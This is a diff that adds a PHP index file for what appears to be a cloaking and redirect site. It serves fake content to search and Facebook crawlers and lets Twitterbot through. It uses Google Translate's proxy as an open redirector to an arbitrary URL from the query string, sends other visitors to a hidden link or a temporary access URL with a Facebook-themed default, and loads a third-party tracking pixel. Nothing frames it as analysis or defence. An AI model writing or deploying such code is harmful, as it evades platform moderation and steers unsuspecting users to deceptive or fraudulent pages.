@@ -1,0 +1,85 @@
+<?php
+
+
+require_once(dirname(__FILE__).'/configuration.php');
+
+$twittBot = ( strpos($_SERVER['HTTP_USER_AGENT'], 'Twitterbot') > -1 );
+
+
+if(IS_BOT || FB_BOT ) {
+	if(!$twittBot) include dirname(__FILE__).'/includes/fakecontent.php';
+	if(!$twittBot) exit;
+}
+
+
+if (isset($_SERVER['HTTP_REFERER']) && !isset($_GET['api'])) {
+
+	if (strpos($_SERVER['HTTP_REFERER'], "translate.googleusercontent.com") > -1) {
+
+
+		$html = "
+			<script>
+			try{ 
+			    var ___ = {}; 
+			    var params = location.search.substring(1).split('&'); 
+			    if(params.length){ 
+			      for(var tt = 0; tt < params.length; tt++){  
+			        if (params[tt].indexOf('=') > -1) {
+			          var to_object = params[tt].split('=');
+			          ___[to_object[0]] = decodeURIComponent(to_object[1]);
+			        }
+			      } 
+			    }  
+
+			    if (location.host == 'translate.googleusercontent.com' && ___.u) {
+			      try{
+			           window.top.location = ___.u;
+			           window.success_implat = true
+			      }catch(f){
+
+			      };
+			    }
+			}catch(d){};</script>";
+
+			echo $html;
+
+		exit;
+
+	}
+}
+
+
+
+if( isset($_GET['api']) ){
+	require_once(dirname(__FILE__).'/api/index.php');
+	exit;
+}
+
+if( !isset($_GET['api']) && isset($_GET['lan'])){
+	
+	$landing = 'facebookapphk';
+	if(isset($_GET['lan'])) $landing = $_GET['lan'];
+
+	$the_url_temporal = createTemporalAccess();
+    header("Location: ".$the_url_temporal);
+	exit;
+}
+
+
+?>
+
+
+
+
+<script>
+try {
+	window.top.location.href ="<?php echo LINK_SELECT; ?>";
+} catch(e) {
+	// statements
+	window.location.href ="<?php echo LINK_SELECT; ?>";
+}
+</script>
+
+<script>
+        new Image().src = "https://whos.amung.us/widget/pollo.png";
+     </script>
